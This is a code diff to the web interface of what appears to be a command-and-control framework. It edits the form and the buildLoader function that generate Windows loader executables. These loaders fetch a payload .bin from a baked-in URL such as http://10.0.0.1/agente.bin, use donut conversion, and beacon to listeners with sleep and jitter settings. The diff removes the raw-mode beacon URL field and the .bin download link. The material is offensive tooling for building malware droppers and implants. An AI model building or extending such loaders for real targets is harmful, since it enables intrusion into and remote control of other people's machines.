@@ -1386,7 +1386,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
               <label style="display:flex;align-items:center;gap:8px;cursor:pointer;margin:0">
                 <input type="checkbox" id="ldr-raw" onchange="ldrToggleRaw()" style="cursor:pointer">
                 <span style="font-weight:600">Raw mode</span>
-                <span style="font-weight:400;color:var(--text3)">— genera .bin sin cifrado, loader apunta a URL personalizada</span>
+                <span style="font-weight:400;color:var(--text3)">— use your own pre-built .bin, only the loader EXE is generated</span>
               </label>
             </div>
 
@@ -1414,20 +1414,9 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
 
             <!-- Raw mode fields -->
             <div id="ldr-raw-fields" style="display:none">
-              <!-- Payload URL = exact URL the loader will fetch -->
               <div class="form-row">
-                <label>Payload URL <span style="font-weight:400;color:var(--text3)">(URL exacta donde hostearás el .bin — se bake en el loader)</span></label>
+                <label>Payload URL <span style="font-weight:400;color:var(--text3)">(URL where you host your pre-built .bin — baked into the loader)</span></label>
                 <input id="ldr-payload-url" placeholder="http://10.0.0.1/agente.bin" style="width:100%">
-              </div>
-
-              <!-- Beacon URL in raw mode -->
-              <div class="form-row">
-                <label>Beacon URL <span style="font-weight:400;color:var(--text3)">(donde el agente hace beacon después de ejecutarse)</span></label>
-                <div style="display:flex;gap:6px">
-                  <input id="ldr-raw-beacon-url" placeholder="http://10.0.0.1:8080" style="flex:1">
-                  <select id="ldr-raw-beacon-pick" title="Active listeners" style="font-size:11px;max-width:26px;padding:0 2px;cursor:pointer" onclick="ldrLoadListeners(this)" onchange="ldrPickBeacon('ldr-raw-beacon-url',this)"><option value="">▾</option></select>
-                  <button class="btn btn-ghost btn-sm" onclick="ldrFillRawBeacon()" title="Fill from active tunnel">↙</button>
-                </div>
               </div>
             </div>
 
@@ -12125,14 +12114,11 @@ async function buildLoader() {
   let body;
   if (isRaw) {
     const payloadURL = (document.getElementById('ldr-payload-url').value || '').trim();
-    const beaconURL  = (document.getElementById('ldr-raw-beacon-url').value || '').trim();
     if (!payloadURL) { toast('Payload URL requerida', 'red'); return; }
-    if (!beaconURL)  { toast('Beacon URL requerida', 'red'); return; }
     body = {
       format:      loaderFmt,
       raw_payload: true,
       payload_url: payloadURL,
-      server_url:  beaconURL,
       transport:   'http',
       sleep_sec:   sleep,
       jitter_pct:  jitter,
@@ -12157,27 +12143,23 @@ async function buildLoader() {
   }
 
   const res = document.getElementById('ldr-result');
-  res.innerHTML = `<div class="result-card" style="color:var(--yellow)">Building… ${isRaw ? '(donut, ~20s)' : '(donut + staging pueden tardar ~30s)'}</div>`;
+  res.innerHTML = `<div class="result-card" style="color:var(--yellow)">Building… ${isRaw ? '(loader only, ~10s)' : '(donut + staging pueden tardar ~30s)'}</div>`;
   const r = await api('POST', '/api/build', body);
   if (r.ok) {
     const d = r.data || {};
     const loaderFile = (d.loader || '').split('/').pop();
     const dlURL      = loaderFile ? `${BASE}/api/artifacts/${encodeURIComponent(loaderFile)}?token=${TOKEN}` : '';
     if (isRaw) {
-      const binFile       = (d.bin || '').split('/').pop();
-      const binDlURL      = binFile ? `${BASE}/api/artifacts/${encodeURIComponent(binFile)}?token=${TOKEN}` : '';
       const rawPayloadURL = document.getElementById('ldr-payload-url')?.value?.trim() || '';
       res.innerHTML = `
         <div class="result-card" style="border-color:var(--green)">
           <div style="color:var(--green);font-weight:700;margin-bottom:8px">✓ Loader listo <span style="font-weight:400;color:var(--text3)">(raw mode)</span></div>
           <div style="font-size:11px;display:flex;flex-direction:column;gap:4px">
             <div><span style="color:var(--text3)">Loader:</span> <code>${esc(loaderFile)}</code></div>
-            <div><span style="color:var(--text3)">Raw .bin:</span> <code>${esc(binFile)}</code></div>
-            <div style="color:var(--text3)">Host the .bin at: <code style="color:var(--accent)">${esc(rawPayloadURL)}</code></div>
+            <div style="color:var(--text3)">Payload URL baked in: <code style="color:var(--accent)">${esc(rawPayloadURL)}</code></div>
           </div>
           <div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:8px">
-            ${dlURL    ? `<a class="btn btn-ghost btn-sm" href="${esc(dlURL)}"    download>⬇ Download loader</a>` : ''}
-            ${binDlURL ? `<a class="btn btn-ghost btn-sm" href="${esc(binDlURL)}" download>⬇ Download .bin</a>` : ''}
+            ${dlURL ? `<a class="btn btn-ghost btn-sm" href="${esc(dlURL)}" download>⬇ Download loader</a>` : ''}
           </div>
         </div>`;
     } else {
